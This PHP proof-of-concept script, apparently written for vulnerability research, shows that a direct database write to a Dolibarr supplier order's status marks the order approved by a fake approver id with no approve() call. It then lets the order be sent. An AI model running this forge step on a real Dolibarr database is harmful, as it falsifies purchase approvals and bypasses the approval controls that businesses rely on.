<?php
// Native APF reproduction against the REAL Dolibarr runtime (supplier-order approval).
$HT = getenv('DOLI_HT');
$_SERVER["DOCUMENT_ROOT"]=$HT; $_SERVER["SERVER_NAME"]="127.0.0.1";
$_SERVER["SERVER_PORT"]="8088"; $_SERVER["REQUEST_URI"]="/"; $_SERVER["REMOTE_ADDR"]="127.0.0.1";
if(!defined('NOSESSION')) define('NOSESSION','1');
if(!defined('NOREQUIREMENU')) define('NOREQUIREMENU','1');
if(!defined('NOREQUIREHTML')) define('NOREQUIREHTML','1');
if(!defined('NOREQUIREAJAX')) define('NOREQUIREAJAX','1');
chdir($HT);
require $HT.'/master.inc.php';
require_once DOL_DOCUMENT_ROOT.'/user/class/user.class.php';
require_once DOL_DOCUMENT_ROOT.'/societe/class/societe.class.php';
require_once DOL_DOCUMENT_ROOT.'/product/class/product.class.php';
require_once DOL_DOCUMENT_ROOT.'/fourn/class/fournisseur.commande.class.php';
global $db,$conf,$langs,$user,$mysoc;
$langs->load("main");
$user=new User($db); $user->fetch(1); $user->getrights();
foreach(array('modSociete','modProduct','modFournisseur') as $mn){
  $mf=DOL_DOCUMENT_ROOT.'/core/modules/'.$mn.'.class.php';
  if(is_file($mf)){ require_once $mf; $mo=new $mn($db); $mo->init(); }
}
$user=new User($db); $user->fetch(1); $user->getrights();
line("rights: valider=".(!empty($user->rights->fournisseur->commande->valider)?1:0).
     " approuver=".(!empty($user->rights->fournisseur->commande->approuver)?1:0));
if(empty($mysoc->country_id)){$mysoc->country_id=1;$mysoc->country_code='FR';}
function line($s){echo $s."\n";}

line("=== Dolibarr ".DOL_VERSION." native APF (supplier-order approval) ===");

// supplier + product
$soc=new Societe($db); $soc->name="APF Supplier"; $soc->fournisseur=1; $soc->client=0;
$soc->country_id=1; $sid=$soc->create($user);
if($sid<=0){line("supplier create FAIL: ".$soc->error); exit(1);}
$p=new Product($db); $p->ref="APF-P1"; $p->label="Widget"; $p->type=0; $p->status_buy=1; $p->price=10;
$pid=$p->create($user); if($pid<=0){ $pf=new Product($db); if($pf->fetch(0,"APF-P1")>0)$pid=$pf->id; }

// supplier order
$o=new CommandeFournisseur($db); $o->socid=$sid;
$oid=$o->create($user);
if($oid<=0){line("order create FAIL: ".$o->error); exit(1);}
$o->fetch($oid);
$r=$o->addline("Widget supply", 10, 5, 20, 0, 0, ($pid>0?$pid:0), 0, "", 0, "HT");
line("addline rc=".$r.($r<0?" err=".$o->error:""));
$o->fetch($oid);
line("order created id=$oid ref=".$o->ref." status=".$o->statut." (0=draft)");
$rv=$o->valid($user); line("valid() rc=".$rv.($rv<=0?" err=".$o->error:"")); $o->fetch($oid);
line("after valid(): status=".$o->statut."  (".CommandeFournisseur::STATUS_VALIDATED."=validated, not yet approved)");

// CONTROL: order is validated but NOT approved; approved-gated state is STATUS_ACCEPTED(2)
line("");
line("[control] fk_statut=".$o->statut.", fk_user_approve=".($o->user_approve_id?:0).
     "  -> approved? ".($o->statut==CommandeFournisseur::STATUS_ACCEPTED?"YES":"NO"));

// FORGE: state-writer sets the approval state directly. No approve() call, no 'approuver'
// right, no authenticated approver. A forged (non-existent) approver id is planted.
$FORGED=99999;
$sql="UPDATE ".MAIN_DB_PREFIX."commande_fournisseur SET fk_statut=".CommandeFournisseur::STATUS_ACCEPTED.
     ", fk_user_approve=".$FORGED." WHERE rowid=".((int)$oid)." AND fk_statut=".CommandeFournisseur::STATUS_VALIDATED;
$db->query($sql);
line("");
line("[forge] direct state write: UPDATE commande_fournisseur SET fk_statut=2, fk_user_approve=$FORGED");

// RESUME: the REAL class reads the persisted state back
$o2=new CommandeFournisseur($db); $o2->fetch($oid);
line("[resume] real CommandeFournisseur::fetch() -> status=".$o2->statut.
     "  approved? ".($o2->statut==CommandeFournisseur::STATUS_ACCEPTED?"YES":"NO").
     "  recorded approver id=".$o2->user_approve_id);

// downstream gate: mark as ordered (commande/order-sent) requires an APPROVED order
$res=$o2->commande($user, dol_now(), 1);
$o2->fetch($oid);
line("[downstream] order-sent action on the forged-approved order -> status=".$o2->statut.
     " (".CommandeFournisseur::STATUS_ORDERSENT."=ordered)  rc=".$res);

line("");
$ok = ($o->statut==CommandeFournisseur::STATUS_VALIDATED) && ($o2->statut>=CommandeFournisseur::STATUS_ACCEPTED);
line("VERDICT: ".($ok?"EXPOSED — a state-only write to fk_statut made the real Dolibarr runtime treat the order as approved (by a non-existent approver) and let the downstream order-sent action proceed, with no approve() call and no approver right.":"inconclusive"));
exit($ok?0:2);
